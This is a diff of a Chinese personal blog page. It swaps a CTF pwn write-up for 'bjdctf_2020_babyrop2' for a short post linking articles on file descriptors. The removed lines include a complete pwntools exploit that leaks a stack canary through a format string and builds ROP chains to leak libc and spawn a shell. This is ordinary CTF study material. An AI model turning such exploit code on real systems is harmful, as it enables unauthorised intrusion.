@@ -2,9 +2,9 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>bjdctf_2020_babyrop2 | sixpar&#39;s blog</title>
-  <meta name="keywords" content=" ROP , canary ">
-  <meta name="description" content="bjdctf_2020_babyrop2 | sixpar&#39;s blog">
+  <title>file_descriptor文件描述符 | sixpar&#39;s blog</title>
+  <meta name="keywords" content=" fd ">
+  <meta name="description" content="file_descriptor文件描述符 | sixpar&#39;s blog">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="现在的想法就是：赶紧刷题   刷题刷的够多才能熟能生巧。给我的时间本就不多了。接下去两个月暑假的时间，我也不可能完全把时间花在pwn学习上了。因为要去HW，当个蓝队菜鸡，HW时间还没确定，地点当然是选择浙江省内。我当然希望自己能够宅在家里然后每天刷题，但是想想能出去实习一下还是不错的，取取经，看别人操作赚一波经验。 我现在还处于pwn初级阶段，一些知识还未完全掌握，只能靠多刷题然后巩固整理。我当">
 <meta property="og:type" content="article">
@@ -469,9 +469,9 @@
 </aside>
 <div id="post">
     <div class="pjax">
-        <article id="post-bjdctf-2020-babyrop2" class="article article-type-post" itemscope itemprop="blogPost">
+        <article id="post-file-descriptor文件描述符" class="article article-type-post" itemscope itemprop="blogPost">
     
-        <h1 class="article-title">bjdctf_2020_babyrop2</h1>
+        <h1 class="article-title">file_descriptor文件描述符</h1>
     
     <div class="article-meta">
         
@@ -481,7 +481,7 @@
             <i class="iconfont icon-category"></i>
             
             
-            <a  data-rel="PWN题">PWN题</a>
+            <a  data-rel="学习">学习</a>
             
         </span>
         
@@ -489,21 +489,19 @@
         <span class="tag">
             <i class="iconfont icon-tag"></i>
             
-            <a class="color4">ROP</a>
-            
-            <a class="color2">canary</a>
+            <a class="color3">fd</a>
             
         </span>
         
     </div>
     <div class="article-meta">
         
-            Created At : <time class="date" title='Updated At: 2020-07-03 13:15:43'>2020-07-03 12:47</time>
+            Created At : <time class="date" title='Updated At: 2020-07-07 13:34:24'>2020-07-07 13:29</time>
         
     </div>
     <div class="article-meta">
         
-        <span>Count:587</span>
+        <span>Count:88</span>
         
         
         <span id="busuanzi_container_page_pv">
@@ -533,7 +531,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#保护机制（64位）："><span class="toc-text">保护机制（64位）：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#利用思路："><span class="toc-text">利用思路：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#完整exp："><span class="toc-text">完整exp：</span></a></li></ol>
+        
     
 <style>
     .left-col .switch-btn,
@@ -549,58 +547,21 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h2 id="保护机制（64位）："><a href="#保护机制（64位）：" class="headerlink" title="保护机制（64位）："></a>保护机制（64位）：</h2><blockquote>
-<p>  Arch:     amd64-64-little<br>    RELRO:    Partial RELRO<br>    Stack:    Canary found<br>    NX:       NX enabled<br>    PIE:      No PIE (0x400000)</p>
+        <blockquote>
+<p>推荐阅读！师傅整理得清楚，赞一个。</p>
 </blockquote>
-<p>可见比babyrop1那题多一个canary的保护机制。</p>
-<h2 id="利用思路："><a href="#利用思路：" class="headerlink" title="利用思路："></a>利用思路：</h2><p>通过格式化漏洞泄露canary，然后溢出通过puts函数的rop链泄露libc地址，再次溢出rop执行getshell</p>
-<p>本题的第一个输入只允许输入6个字节，__isoc99_scanf(“%6s”, &amp;format);    所以输出也是6个字节。<br>所以我们就就一个一个偏移试过去，aa%1$p 、aa%2$p ……</p>
-<p>当输入  aa%6$p 时，得到 aa0x702436256161  ，可见我们输入的内容在偏移6上，所以格式化字符串的偏移是6</p>
-<p>而canary的值是var_8变量，处在 rbp-0x8 的位置，我们要计算偏移。我们输入的format变量位于 ebp-0x10 的位置，所以偏移就是 0x8 </p>
-<p>所以我们尝试直接在第一个输入处输入 %7$p ，输出来的16字节数据一定是canary的值没错了。</p>
-<p>接收canary的值 ：</p>
-<pre><code class="python">p.recvuntil(&#39;0x&#39;)
-canary=int(p.recv(16),16)</code></pre>
-<p>一般canary的位置都在 ebp-8 的位置。所以我们后续溢出的时候把canary的值填回去就能绕过检查了，</p>
-<p>具体操作：</p>
+<p>1.第一篇介绍了 终端tty 以及 shell 的概念。</p>
 <blockquote>
-<p>payload=’a’*0x18+p64(canary)+p64(0xdeadbeef)+ …….</p>
+<p><a href="https://m4x.fun/post/play-with-file-descriptor-1/" target="_blank" rel="noopener">https://m4x.fun/post/play-with-file-descriptor-1/</a></p>
 </blockquote>
-<p>然后后续操作就跟 babyrop1 一样了。</p>
-<p>对了，本题踩的坑：  在泄露puts地址时，要加上 p.recv()  表示全部接收完。要不然puts地址数据会丢失  （调试得puts的地址为 0xa ，显然不对啊），导致后续操作都出错了。要不是我把puts地址给打印出来看看，我还不知道错在哪里呢  QAQ</p>
-<h2 id="完整exp："><a href="#完整exp：" class="headerlink" title="完整exp："></a>完整exp：</h2><pre><code class="python">#coding:utf-8
-from pwn import *
-p=process(&#39;./bjdctf_2020_babyrop2&#39;)
-# p=remote(&#39;node3.buuoj.cn&#39;,28226)
-elf=ELF(&#39;./bjdctf_2020_babyrop2&#39;)
-libc=ELF(&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;)
-
-p.recvuntil(&#39;give u some gift to help u!&#39;)
-p.sendline(&#39;%7$p&#39;)
-p.recvuntil(&#39;0x&#39;)
-canary=int(p.recv(16),16)
-print &quot;canary is &quot;+hex(canary)
-
-pop_rdi=0x400993
-puts_plt=elf.plt[&#39;puts&#39;]
-puts_got=elf.got[&#39;puts&#39;]
-vuln_addr=0x0400887
-
-payload1=&#39;a&#39;*0x18+p64(canary)+p64(0xdeadbeef)+p64(pop_rdi)+p64(puts_got)
-payload1+=p64(puts_plt)+p64(vuln_addr)
-p.recvuntil(&#39;me u story!&#39;)
-p.sendline(payload1)
-p.recv() 
-puts_addr = u64(p.recv(6).ljust(8,&#39;\x00&#39;))
-print &quot;puts_addr is &quot;+hex(puts_addr)
-
-libc_base= puts_addr - libc.symbols[&#39;puts&#39;]
-system_addr=libc_base + libc.symbols[&#39;system&#39;]
-binsh_addr= libc_base+ libc.search(&quot;/bin/sh\x00&quot;).next()
-
-payload2=&#39;a&#39;*0x18 +p64(canary)+&#39;b&#39;*8+p64(pop_rdi)+p64(binsh_addr)+p64(system_addr)
-p.sendline(payload2)
-p.interactive()</code></pre>
+<p>2.第二篇介绍了 file descriptor （简称fd）文件描述符。</p>
+<blockquote>
+<p><a href="https://m4x.fun/post/play-with-file-descriptor-2/" target="_blank" rel="noopener">https://m4x.fun/post/play-with-file-descriptor-2/</a></p>
+</blockquote>
+<p>3.第三篇讲的是 与 fd 有关的题目。</p>
+<blockquote>
+<p><a href="https://m4x.fun/post/play-with-file-descriptor-3/" target="_blank" rel="noopener">https://m4x.fun/post/play-with-file-descriptor-3/</a></p>
+</blockquote>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论嗷。 </span>
